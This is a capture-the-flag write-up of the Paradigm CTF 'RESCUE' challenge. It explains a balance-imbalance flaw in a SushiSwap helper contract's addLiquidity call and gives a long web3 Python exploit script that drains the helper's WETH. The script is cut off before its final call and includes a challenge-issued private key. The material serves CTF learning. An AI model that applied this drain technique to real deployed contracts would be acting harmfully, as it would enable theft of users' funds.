# RESCUE (148 points, pwn)

Solved by: Kaiziron

Team: D53_H473r5 

### Description :
```
DESCRIPTION
I accidentally sent some WETH to a contract, can you help me?

ACCESS
nc 34.123.187.206 31337

RESOURCES
https://github.com/paradigmxyz/paradigm-ctf-infrastructure
/resources/rescue.zip
```

The `Setup` contract has sent 10 WETH to the `MasterChefHelper` contract when deploying it. We have to drain all 10 WETH away from the `MasterChefHelper` contract to solve it.

### Setup contract :
```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "./MasterChefHelper.sol";

interface WETH9 is ERC20Like {
    function deposit() external payable;
}

contract Setup {
    
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    MasterChefHelper public immutable mcHelper;

    constructor() payable {
        mcHelper = new MasterChefHelper();
        weth.deposit{value: 10 ether}();
        weth.transfer(address(mcHelper), 10 ether); // whoops
    }

    function isSolved() external view returns (bool) {
        return weth.balanceOf(address(mcHelper)) == 0;
    }

}
```

### MasterChefHelper contract : 
```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "./UniswapV2Like.sol";

interface ERC20Like {
    function transferFrom(address, address, uint) external;
    function transfer(address, uint) external;
    function approve(address, uint) external;
    function balanceOf(address) external view returns (uint);
}

interface MasterChefLike {
    function poolInfo(uint256 id) external returns (
        address lpToken,
        uint256 allocPoint,
        uint256 lastRewardBlock,
        uint256 accSushiPerShare
    );
}

contract MasterChefHelper {

    MasterChefLike public constant masterchef = MasterChefLike(0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd);
    UniswapV2RouterLike public constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external {
        (address lpToken,,,) = masterchef.poolInfo(poolId);
        address tokenOut0 = UniswapV2PairLike(lpToken).token0();
        address tokenOut1 = UniswapV2PairLike(lpToken).token1();

        ERC20Like(tokenIn).approve(address(router), type(uint256).max);
        ERC20Like(tokenOut0).approve(address(router), type(uint256).max);
        ERC20Like(tokenOut1).approve(address(router), type(uint256).max);
        ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);

        // swap for both tokens of the lp pool
        _swap(tokenIn, tokenOut0, amountIn / 2);
        _swap(tokenIn, tokenOut1, amountIn / 2);

        // add liquidity and give lp tokens to msg.sender
        _addLiquidity(tokenOut0, tokenOut1, minAmountOut);
    }

    function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal {
        (,, uint256 amountOut) = router.addLiquidity(
            token0, 
            token1, 
            ERC20Like(token0).balanceOf(address(this)), 
            ERC20Like(token1).balanceOf(address(this)), 
            0, 
            0, 
            msg.sender, 
            block.timestamp
        );
        require(amountOut >= minAmountOut);
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
```

### Explaining what the contract does : 

There is only one external function on MasterChefHelper contract : `swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut)`

It is interacting with the MasterChef contract of SushiSwap and the UniswapV2Router contract deployed by SushiSwap :
https://docs.sushi.com/docs/Developers/Sushiswap/MasterChef
https://docs.uniswap.org/protocol/V2/reference/smart-contracts/router-02
https://dev.sushi.com/docs/Developers/Deployment%20Addresses

What `swapTokenForPoolToken()` doing is first get the lptoken of the token pair of the poolId in MasterChef and get address of the token pair on that pool.

Then run `approve()` for `tokenIn` and the pair of tokens, and it will swap half of the amount of `tokenIn` to each token in the pair with UniswapV2Router.

Finally, it add liquidity of the token pair to UniswapV2Router, and send the lptoken to the caller.

### How we can drain 10 WETH away from MasterChefHelper :

I am using USDT as the `tokenIn`, and using poolId of 1, which is the pair of USDC/WETH.

We are going to need some USDT for calling `swapTokenForPoolToken()` and some USDC/WETH to add liquidity, in case there are no such pool for USDT/USDC or USDT/WETH.

Also, we have to approve the router to transfer our USDC/WETH, and approve the helper and the router to transfer our USDT.

I will just deposit some ETH to the WETH contract to get WETH and then swap WETH to some USDT and USDC with the router.

When the helper contract is adding liquidity, it has to add same value of each pair to the pool.

```solidity
...
(,, uint256 amountOut) = router.addLiquidity(
            token0, 
            token1, 
            ERC20Like(token0).balanceOf(address(this)), 
            ERC20Like(token1).balanceOf(address(this)), 
            0, 
            0, 
            msg.sender, 
            block.timestamp
        );
...
```

But it is calling `addLiquidity()` with all the tokens it got, so there will be an imbalance of USCD and WETH, as it already has 10 WETH. In this case, there will be WETH remaining on the helper contract, as only same value of token pair will be added to the pool. 

So we have to send >10 WETH worth of USDC to the helper contract before calling `swapTokenForPoolToken()`, to drain all 10 WETH completely. 

Finally, call `swapTokenForPoolToken()` with poolID of 1 (USDC/WETH pair) and tokenIn as USDT. Then there should have no WETH remaining on the helper contract. 

### Exploit script :
```python
from web3 import Web3, HTTPProvider
import rlp
from eth_account import Account

web3 = Web3(HTTPProvider('http://34.123.187.206:8545/718b4497-c5bc-48b8-9ca8-bb3563bd6ab8'))

print(f'Block number : {web3.eth.get_block("latest").number}')

# setup contract address
setup_address = "0x3B4c1E4769e4Aa6D1cD625EB21Fb780e52EFF3B1"
nonce = 1
contract_address = Web3.toChecksumAddress(Web3.keccak(rlp.encode([int(setup_address, 16), nonce]))[12:].hex())
print(f'Contract address : {contract_address}')


# private key the instance give us
private_key = "0xd5340368fa8dcf56d1cef9fba367061caf9e8c316ac62787cd940cc2674a5c66"
acct = Account.from_key(private_key)
wallet = acct.address

balance = web3.fromWei(web3.eth.getBalance(wallet), 'ether')
print(f'Wallet : {wallet}')
print(f'Balance (ETH) : {balance}')



# Get 100 WETH
weth_address = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
weth_abi = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"guy","type":"address"},{"name":"wad","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"src","type":"address"},{"name":"dst","type":"address"},{"name":"wad","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"wad","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"dst","type":"address"},{"name":"wad","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":true,"name":"guy","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":true,"name":"dst","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"dst","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Withdrawal","type":"event"}]'
weth_instance = web3.eth.contract(address=weth_address, abi=weth_abi)
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 1000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet,
    'value': web3.toWei('100', 'ether')
}
transaction = weth_instance.functions.deposit().buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print('Get 100 WETH')
print(tx_receipt['status'])
print(transaction_hash)



# Approve router to transfer our WETH
weth_address = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
weth_abi = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"guy","type":"address"},{"name":"wad","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"src","type":"address"},{"name":"dst","type":"address"},{"name":"wad","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"wad","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"dst","type":"address"},{"name":"wad","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":true,"name":"guy","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":true,"name":"dst","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"dst","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Withdrawal","type":"event"}]'
weth_instance = web3.eth.contract(address=weth_address, abi=weth_abi)
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 1000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = weth_instance.functions.approve("0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F", web3.toWei(1000000, 'ether')).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print('Approve router to transfer our WETH')
print(tx_receipt['status'])
print(transaction_hash)


# Approve helper and router to transfer our USDT
usdt_address = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
weth_abi = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"guy","type":"address"},{"name":"wad","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"src","type":"address"},{"name":"dst","type":"address"},{"name":"wad","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"wad","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"dst","type":"address"},{"name":"wad","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":true,"name":"guy","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":true,"name":"dst","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"dst","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Withdrawal","type":"event"}]'
usdt_instance = web3.eth.contract(address=usdt_address, abi=weth_abi)
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 1000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = usdt_instance.functions.approve(contract_address, 500000000*10**6).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print('Approve helper to transfer our USDT')
print(tx_receipt['status'])
print(transaction_hash)

nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 1000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = usdt_instance.functions.approve("0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F", 500000000*10**6).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print('Approve router to transfer our USDT')
print(tx_receipt['status'])
print(transaction_hash)



# Approve router to transfer our USDC
usdc_address = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
usdc_instance = web3.eth.contract(address=usdc_address, abi=weth_abi)
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 1000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = usdc_instance.functions.approve("0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F", 500000000*10**6).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print('Approve router to transfer our USDC')
print(tx_receipt['status'])
print(transaction_hash)



# Get 20 ETH worth of USDT and USDC by swapping WETH to USDT and USDC in sushiswap
router_address = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F"
router_abi = '[{"inputs":[{"internalType":"address","name":"_factory","type":"address"},{"internalType":"address","name":"_WETH","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"WETH","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenA","type":"address"},{"internalType":"address","name":"tokenB","type":"address"},{"internalType":"uint256","name":"amountADesired","type":"uint256"},{"internalType":"uint256","name":"amountBDesired","type":"uint256"},{"internalType":"uint256","name":"amountAMin","type":"uint256"},{"internalType":"uint256","name":"amountBMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"addLiquidity","outputs":[{"internalType":"uint256","name":"amountA","type":"uint256"},{"internalType":"uint256","name":"amountB","type":"uint256"},{"internalType":"uint256","name":"liquidity","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amountTokenDesired","type":"uint256"},{"internalType":"uint256","name":"amountTokenMin","type":"uint256"},{"internalType":"uint256","name":"amountETHMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"addLiquidityETH","outputs":[{"internalType":"uint256","name":"amountToken","type":"uint256"},{"internalType":"uint256","name":"amountETH","type":"uint256"},{"internalType":"uint256","name":"liquidity","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"factory","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint256","name":"reserveIn","type":"uint256"},{"internalType":"uint256","name":"reserveOut","type":"uint256"}],"name":"getAmountIn","outputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"reserveIn","type":"uint256"},{"internalType":"uint256","name":"reserveOut","type":"uint256"}],"name":"getAmountOut","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"}],"name":"getAmountsIn","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"}],"name":"getAmountsOut","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountA","type":"uint256"},{"internalType":"uint256","name":"reserveA","type":"uint256"},{"internalType":"uint256","name":"reserveB","type":"uint256"}],"name":"quote","outputs":[{"internalType":"uint256","name":"amountB","type":"uint256"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"address","name":"tokenA","type":"address"},{"internalType":"address","name":"tokenB","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountAMin","type":"uint256"},{"internalType":"uint256","name":"amountBMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"removeLiquidity","outputs":[{"internalType":"uint256","name":"amountA","type":"uint256"},{"internalType":"uint256","name":"amountB","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountTokenMin","type":"uint256"},{"internalType":"uint256","name":"amountETHMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"removeLiquidityETH","outputs":[{"internalType":"uint256","name":"amountToken","type":"uint256"},{"internalType":"uint256","name":"amountETH","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountTokenMin","type":"uint256"},{"internalType":"uint256","name":"amountETHMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"removeLiquidityETHSupportingFeeOnTransferTokens","outputs":[{"internalType":"uint256","name":"amountETH","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountTokenMin","type":"uint256"},{"internalType":"uint256","name":"amountETHMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bool","name":"approveMax","type":"bool"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"removeLiquidityETHWithPermit","outputs":[{"internalType":"uint256","name":"amountToken","type":"uint256"},{"internalType":"uint256","name":"amountETH","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountTokenMin","type":"uint256"},{"internalType":"uint256","name":"amountETHMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bool","name":"approveMax","type":"bool"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"removeLiquidityETHWithPermitSupportingFeeOnTransferTokens","outputs":[{"internalType":"uint256","name":"amountETH","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenA","type":"address"},{"internalType":"address","name":"tokenB","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountAMin","type":"uint256"},{"internalType":"uint256","name":"amountBMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bool","name":"approveMax","type":"bool"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"removeLiquidityWithPermit","outputs":[{"internalType":"uint256","name":"amountA","type":"uint256"},{"internalType":"uint256","name":"amountB","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapETHForExactTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactETHForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactETHForTokensSupportingFeeOnTransferTokens","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETHSupportingFeeOnTransferTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokensSupportingFeeOnTransferTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint256","name":"amountInMax","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapTokensForExactETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint256","name":"amountInMax","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapTokensForExactTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]'
router_instance = web3.eth.contract(address=router_address, abi=router_abi)
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 1000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = router_instance.functions.swapExactTokensForTokens(web3.toWei(20, 'ether'), 0, ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0xdAC17F958D2ee523a2206206994597C13D831ec7"], wallet, 26610085500).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print('Get 20 ETH worth of USDT by swapping WETH to USDT in sushiswap')
print(tx_receipt['status'])
print(transaction_hash)

nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 1000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = router_instance.functions.swapExactTokensForTokens(web3.toWei(20, 'ether'), 0, ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"], wallet, 26610085500).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print('Get 20 ETH worth of USDC by swapping WETH to USDC in sushiswap')
print(tx_receipt['status'])
print(transaction_hash)




# Send >10 WETH worth of USDC to helper contract to balance the amount of WETH, so when adding liquidity, it can drain up the 10 WETH
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 1000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = usdc_instance.functions.transfer(contract_address, 20000 * 10**6).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print('Sending >10 WETH worth of USDC to helper contract to balance out the 10 WETH for adding liquidity')
